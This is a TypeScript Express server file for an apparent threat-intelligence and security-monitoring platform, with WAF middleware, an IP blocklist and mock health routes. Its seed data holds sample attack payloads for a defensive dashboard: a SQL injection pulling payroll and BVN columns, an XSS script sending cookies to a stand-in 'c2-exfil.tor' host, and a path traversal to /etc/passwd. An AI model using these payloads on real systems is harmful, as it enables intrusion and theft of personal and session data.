import express from 'express';
import cors from 'cors';
import { CONFIG } from './config';
import { db } from './db/database';
import { redis } from './redis/client';
import { udpIngestServer } from './ingest/udp-ingest';
import { probeScheduler } from './prober/probe-scheduler';

// Routers
import { httpIngestRouter } from './ingest/http-ingest';
import { overviewRouter } from './routes/overview';
import { incidentsRouter } from './routes/incidents';
import { probesRouter } from './routes/probes';
import { threatsRouter } from './routes/threats';
import { queriesRouter } from './routes/queries';
import { advisorRouter } from './routes/advisor';
import { reportsRouter } from './routes/reports';
import { simulationRouter } from './routes/simulation';
import { authRouter } from './routes/auth';
import { usersRouter } from './routes/users';
import { tenantsRouter } from './routes/tenants';
import { trafficRouter } from './routes/traffic.js';
import { socRouter } from './routes/soc';
import { auditRouter } from './routes/audit';
import { ingestQueue } from './ingest/ingest-queue';
import { heuristicEngine } from './threat/heuristic-engine';
import { geoIPService } from './threat/geoip-service';
import { realtimeAlertHub } from './alerts/realtime-alert-hub';
import { socEngine } from './soc/soc-engine';
import { getWATFormattedDate } from './db/database';

export const app = express();

app.use(cors({
  origin: '*', // Allow HRMS and any other registered system to call ingest
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Telemetry-Key', 'X-Telemetry-Signature'],
}));
app.use(express.json({ limit: '5mb' }));
app.use(express.urlencoded({ extended: true }));

// Active Self-Defense WAF & Real-Time Intrusion Detection Middleware for The Watch Platform
app.use(async (req, res, next) => {
  // Skip internal SSE stream & simulation/ingest endpoints (handled by IngestQueue)
  if (
    req.path.startsWith('/api/v1/telemetry') ||
    req.path.startsWith('/api/v1/simulation') ||
    req.path.startsWith('/api/v1/threats/stream') ||
    req.path.startsWith('/api/v1/audit/track')
  ) {
    return next();
  }

  const clientIp = ((req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || '127.0.0.1')
    .split(',')[0]
    .trim();

  // 1. Enforce Active SOC IP Blocklist
  if (socEngine.isIpBlocked(clientIp) && !req.path.startsWith('/api/v1/soc/blocklist')) {
    socEngine.recordBlockedRequest(clientIp);
    res.status(403).json({
      error: 'IP_QUARANTINED_BY_THE_WATCH_SOC',
      message: `Access Denied: Your IP address (${clientIp}) has been blocked by The Watch Active Intrusion Firewall.`,
      ip: clientIp,
      timestampWat: getWATFormattedDate(),
    });
    return;
  }

  // 2. Inspect URL, query params, and request body for hacking / exploit signatures targeting The Watch
  const bodyStr = req.body && Object.keys(req.body).length > 0 ? JSON.stringify(req.body) : '';
  const match = heuristicEngine.evaluate({
    method: req.method,
    path: req.originalUrl || req.path,
    payload: bodyStr,
    userAgent: req.headers['user-agent'],
    clientIp,
  });

  if (match.detected) {
    try {
      const geo = await geoIPService.resolve(clientIp);
      const incident = {
        id: `inc-watch-self-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
        system_id: 'THE-WATCH-SOC',
        incident_type: match.incidentType,
        threat_classification: `${match.threatClassification} (Targeting The Watch SOC)`,
        severity: match.severity,
        offending_ip: clientIp,
        geo_country: geo.country,
        geo_region: geo.region,
        geo_city: geo.city,
        geo_lat: geo.latitude,
        geo_lng: geo.longitude,
        asn: geo.asn,
        isp: geo.isp,
        is_proxy_or_vpn: geo.isProxyOrVpn,
        target_endpoint: req.originalUrl || req.path,
        http_method: req.method,
        captured_payload: bodyStr || req.originalUrl || req.path,
        status: 'UNRESOLVED' as const,
        mitigation_blueprint: match.mitigationBlueprint,
        remediation_summary: match.remediationSummary,
        created_at_wat: getWATFormattedDate(),
      };
      await db.saveIncident(incident);
      realtimeAlertHub.broadcastThreat(incident);
      socEngine.createCaseFromIncident({
        id: incident.id,
        systemId: 'THE-WATCH-SOC',
        threatClassification: incident.threat_classification,
        severity: incident.severity,
        offendingIp: clientIp,
        targetEndpoint: incident.target_endpoint,
        capturedPayload: incident.captured_payload,
      });
    } catch (err) {
      console.error('[SelfDefenseWAF] Error recording intrusion attempt:', err);
    }
  }

  next();
});

// Request logging in development
app.use((req, res, next) => {
  if (req.path.startsWith('/api/v1/telemetry/ingest')) {
    // skip high-frequency ingest logs
    return next();
  }
  const start = Date.now();
  res.on('finish', () => {
    const duration = Date.now() - start;
    if (duration > 100 || res.statusCode >= 400) {
      console.log(`[HTTP] ${req.method} ${req.path} -> ${res.statusCode} (${duration}ms)`);
    }
  });
  next();
});

// Mock routes for synthetic probe targets
app.get('/api/mock/noun/health', (req, res) => {
  res.json({ status: 'UP', service: 'NOUN-HRMS Core', timestamp: new Date().toISOString() });
});

app.get('/api/mock/noun/auth/session', (req, res) => {
  res.json({ status: 'VALID', activeSessions: 1420, sessionStore: 'Redis-Cluster-OK' });
});

app.get('/api/mock/noun/payroll/status', (req, res) => {
  res.json({ status: 'IDLE', batchQueue: 0, lastRun: '2026-09-20T12:00:00Z' });
});

app.get('/api/mock/clinic/health', (req, res) => {
  res.json({ status: 'UP', service: 'Clinic-EHR', dbHealth: 'CONNECTED' });
});

app.get('/api/mock/dispatch/health', (req, res) => {
  res.json({ status: 'UP', service: 'Security-Dispatch', webrtcRelay: 'OPERATIONAL' });
});

// REST API Routers
app.use('/api/v1/auth', authRouter);
app.use('/api/v1/users', usersRouter);
app.use('/api/v1/tenants', tenantsRouter);
app.use('/api/v1/telemetry', httpIngestRouter);
app.use('/api/v1/overview', overviewRouter);
app.use('/api/v1/incidents', incidentsRouter);
app.use('/api/v1/probes', probesRouter);
app.use('/api/v1/threats', threatsRouter);
app.use('/api/v1/queries', queriesRouter);
app.use('/api/v1/advisor', advisorRouter);
app.use('/api/v1/reports', reportsRouter);
app.use('/api/v1/simulation', simulationRouter);
app.use('/api/v1/traffic', trafficRouter);
app.use('/api/v1/soc', socRouter);
app.use('/api/v1/audit', auditRouter);

// Root health check
app.get('/health', (req, res) => {
  res.json({
    platform: 'The Watch: Threat Intelligence & Observability Platform',
    status: 'ONLINE',
    timezone: CONFIG.TIMEZONE,
    timestamp: new Date().toISOString(),
  });
});

async function seedInitialIncidents() {
  // Pre-seed a few realistic incidents so initial dashboard load is rich
  ingestQueue.enqueue([
    {
      systemId: 'NOUN-HRMS',
      method: 'POST',
      path: '/api/v1/payroll/export',
      statusCode: 500,
      latencyMs: 120,
      clientIp: '194.26.29.112',
      payloadSnippet: `dept_id=1' UNION SELECT staff_id, full_name, bvn, salary FROM staff_payroll WHERE '1'='1' --`,
      userAgent: 'sqlmap/1.7.2#stable',
    },
    {
      systemId: 'NOUN-HRMS',
      method: 'POST',
      path: '/api/v1/auth/session',
      statusCode: 400,
      latencyMs: 30,
      clientIp: '185.220.101.5',
      payloadSnippet: `<script>fetch('https://c2-exfil.tor/loot?c='+document.cookie)</script>`,
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    },
    {
      systemId: 'Clinic-EHR',
      method: 'GET',
      path: '/api/v1/records/download?file=../../../../../../etc/passwd%00.pdf',
      statusCode: 403,
      latencyMs: 14,
      clientIp: '45.154.255.89',
      payloadSnippet: '../../../../../../etc/passwd',
    },
    {
      systemId: 'NOUN-HRMS',
      method: 'POST',
      path: '/api/v1/payroll/batch',
      statusCode: 200,
      latencyMs: 840,
      clientIp: '102.89.23.45',
      queryLatencyMs: 835.6,
      queryText: 'SELECT * FROM payroll_records WHERE tenant_id = $1 AND status = $2 ORDER BY created_at DESC',
    },
  ]);
}

export async function bootstrap(customPort?: number, customUdpPort?: number) {
  await db.initialize();
  await redis.initialize();

  const port = customPort || parseInt(process.env.PORT || '', 10) || CONFIG.PORT;
  const udpPort = customUdpPort || parseInt(process.env.UDP_PORT || '', 10) || CONFIG.UDP_PORT;

  // Start HTTP Server
  const server = app.listen(port, CONFIG.HOST, () => {
    console.log(`\n🛡️  ======================================================`);
    console.log(`🛡️  THE WATCH: Observability & Threat Intelligence Server`);
    console.log(`🛡️  HTTP API Gateway: http://${CONFIG.HOST}:${port}`);
    console.log(`🛡️  Timezone: ${CONFIG.TIMEZONE} (WAT / UTC+1)`);
    console.log(`🛡️  ======================================================\n`);
  });

  // Start UDP Server
  udpIngestServer.start(udpPort);

  // Start Synthetic Heartbeat Prober
  probeScheduler.start(30000);

  // Seed sample telemetry
  await seedInitialIncidents();

  return server;
}

if (process.env.NODE_ENV !== 'test') {
  bootstrap().catch((err) => {
    console.error('Fatal bootstrapping error:', err);
  });
}
